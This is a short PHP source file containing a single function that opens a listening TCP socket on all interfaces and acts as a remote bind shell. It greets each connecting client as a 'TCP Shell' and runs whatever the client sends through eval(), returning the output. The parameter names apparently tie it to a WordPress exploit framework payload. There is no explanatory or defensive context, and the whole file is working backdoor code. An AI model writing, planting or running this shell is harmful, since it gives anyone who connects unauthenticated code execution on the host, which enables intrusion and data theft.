<?php
function startTcpServer($port, $wpxf_disabled, $wpxf_exec) {
    if (in_array('socket_create', $wpxf_disabled)) {
        return;
    }

    $sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
    if ($sock === false) {
        echo "socket_create() failed: reason: " . socket_strerror(socket_last_error()) . "\n";
        return;
    }

    if (socket_bind($sock, '0.0.0.0', $port) === false) {
        echo "socket_bind() failed: reason: " . socket_strerror(socket_last_error($sock)) . "\n";
        socket_close($sock);
        return;
    }

    if (socket_listen($sock, 5) === false) {
        echo "socket_listen() failed: reason: " . socket_strerror(socket_last_error($sock)) . "\n";
        socket_close($sock);
        return;
    }

    while (true) {
        $client = socket_accept($sock);
        if ($client === false) {
            echo "socket_accept() failed: reason: " . socket_strerror(socket_last_error($sock)) . "\n";
            continue;
        }

        $cwd = getcwd();
        socket_write($client, "Welcome to the TCP Shell\nCurrent Directory: $cwd\n");

        while (true) {
            $input = socket_read($client, 1024);
            if ($input === false || $input === '') {
                break;
            }

            $command = trim($input);
            if ($command === 'exit' || $command === 'quit') {
                break;
            } elseif (strpos($command, 'cd ') === 0) {
                $dir = substr($command, 3);
                if (@chdir($dir)) {
                    $cwd = getcwd();
                    socket_write($client, "Changed directory to: $cwd\n");
                } else {
                    socket_write($client, "Failed to change directory\n");
                }
            } else {
                ob_start();
                eval("?>$command<?php");
                $output = ob_get_clean();
                socket_write($client, "$output\nCurrent Directory: $cwd\n");
            }
        }

        socket_close($client);
    }

    socket_close($sock);
}
